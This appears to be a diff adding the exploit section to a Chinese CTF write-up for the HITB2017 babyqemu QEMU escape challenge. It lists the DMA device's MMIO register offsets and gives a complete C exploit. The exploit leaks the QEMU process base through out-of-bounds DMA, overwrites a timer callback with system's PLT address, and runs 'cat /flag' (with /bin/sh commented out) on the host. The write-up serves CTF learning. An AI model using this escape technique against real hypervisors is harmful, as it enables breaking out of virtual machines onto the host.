@@ -337,3 +337,126 @@ hitb_dma_timer函数中,有一处还是很明显的,前面在计算v2 = (LODWORD
 
 # 调试及exp编写
 
+功能:read/write
+
+dma.src 128
+
+&dma.src + 4 132
+
+dma.dst 136
+
+dma.dst + 4 140
+
+dma.cnt 144
+
+dma.cmd 152
+
+
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <assert.h>
+#include <string.h>
+#include <time.h>
+
+#define PAGE_SIZE 0x1000
+
+uint64_t base = 0;
+int pm = 0;
+
+int mmio_read(uint64_t addr)
+{
+	return *((uint32_t *)(base + addr));
+}
+
+void mmio_write(uint64_t  addr,uint32_t value)
+{
+	 *((uint32_t *)(base + addr)) = value;
+}
+
+uint32_t v2p(void * addr)
+{
+    uint32_t index = (uint64_t)addr / PAGE_SIZE;
+    lseek(pm,index * 8,SEEK_SET);
+    uint64_t num = 0;
+    read(pm,&num,8);
+    return ((num & (((uint64_t)1 << 55) - 1)) << 12) + (uint64_t)addr % PAGE_SIZE;
+
+}
+
+char cmd[] = "cat /flag";
+//char cmd[] = "/bin/sh";
+int main()
+{
+	puts("[*]start pwn");
+	int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
+	assert(fd != -1);
+	
+	base = (uint64_t)mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+	assert(base != -1);	
+	
+	pm = open("/proc/self/pagemap",O_RDONLY); 	
+	assert(pm != -1);	
+
+	void * buf = malloc(0x1000);
+
+	memset(buf,0,0x1000);
+
+	mmio_write(128,0x40000 + 0x1000); //dma.src = 0x40000 + 4096
+	mmio_write(144,0x8);//dma.cnt = 0x10
+	mmio_write(136,v2p(buf));//dma.dst = buf
+
+	mmio_write(152,3);//cmd = 0b011
+	sleep(1);
+
+	uint64_t leak = *(uint64_t *)buf;
+	printf("leak:0x%llx\n",leak);
+	uint64_t proc_base = leak - 0x283dd0;
+	printf("proc_base:0x%llx\n",proc_base);
+
+	uint64_t system_plt = proc_base + 0x1FDB18;
+	printf("system_plt:0x%llx\n",system_plt);	
+	puts("[*] write cmd");
+	memset(buf,0,0x1000);
+	memcpy(buf,cmd,10);
+
+	mmio_write(128,v2p(buf)); //dma.src = buf
+        mmio_write(144,10);//dma.cnt = 0x10
+        mmio_write(136,0x40000+0);//dma.dst = 0x40000+0
+
+        mmio_write(152,1);
+	sleep(1);
+	
+	puts("[*] write system");
+	memset(buf,0,0x1000);
+	*(uint64_t *)buf = system_plt;
+	mmio_write(128,v2p(buf)); //dma.src = buf
+        mmio_write(144,8);//dma.cnt = 0x10
+        mmio_write(136,0x40000+0x1000);//dma.dst = 0x40000+0x10000
+	mmio_write(152,1);
+        sleep(1);
+
+	puts("[*] hijack");
+	mmio_write(128,0x40000 + 0x0); //dma.src = 0x40000 + 0
+        mmio_write(144,10);//dma.cnt = 0x10
+        mmio_write(136,v2p(buf));//dma.dst = buf
+
+        mmio_write(152,7);//cmd = 0b011
+        sleep(1);
+
+	return 0;
+}
+```
+
+一开始忘记在每次执行hitb_dma_timer后sleep了,导致leak不出来.......
+
+![](HITB2017-babyqemu\succ.png)
+
+# 总结
+
+总体上比上一题难了一些,涉及到了多线程(虽然后来发现是为了配合QEMUTimer),但是过程还是很有趣的,使用mmio和模拟的DMA,对于DMA的理解应该更容易些了.
